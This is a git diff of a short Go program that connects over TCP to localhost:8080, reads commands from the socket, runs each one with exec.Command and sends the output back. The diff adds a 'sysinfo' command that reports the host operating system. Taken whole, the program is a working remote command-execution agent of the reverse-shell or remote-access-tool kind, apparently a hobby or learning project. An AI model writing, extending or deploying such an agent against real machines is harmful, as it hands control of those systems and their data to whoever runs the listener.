@@ -3,31 +3,24 @@ package main
 import (
 	"bufio"
 	"strings"
-	//"encoding/gob"
 	"fmt"
 	"log"
 	"net"
 	"os/exec"
-	//"runtime"
+	"runtime"
 )
 
-/*
-type P struct {
-	M, N int64
-}
-*/
 
 func main() {
 
 	conn, err := net.Dial("tcp", "localhost:8080")
 
 	if err != nil {
-		log.Fatal("Connection failled with %s\n", err)
+		log.Fatal("Connection failled with", err)
 	}
 
 	for {
-		//dec := gob.NewDecoder(conn)
-		//dec.Decode()
+
 		cmd, _ := bufio.NewReader(conn).ReadString('\n')
 		cmd = strings.TrimSuffix(cmd, "\n")
 		cmd = strings.TrimSuffix(cmd, "\n")
@@ -36,20 +29,25 @@ func main() {
 			break
 		}
 
-		out, err := exec.Command(cmd).Output()
+		if strings.Compare(cmd, "sysinfo") == 0 {
+			var osType string
+			if runtime.GOOS == "windows" {
+				osType = "windows"
+			} else {
+				osType = "unix"
+			}
+			fmt.Fprintf(conn, osType)
+
+		} else {
+			out, err := exec.Command(cmd).Output()
 		
-		if err != nil {
-			fmt.Println("%s", err)
-		}
+			if err != nil {
+				fmt.Println("", err)
+			}
 
-		output := string(out[:])
-		fmt.Fprintf(conn, output)
-
-		/*
-		if runtime.GOOS == "windows" {
-			cmd = exec.Command("dir")
+			output := string(out[:])
+			fmt.Fprintf(conn, output)
 		}
-		*/
 	}
 	conn.Close()
 }
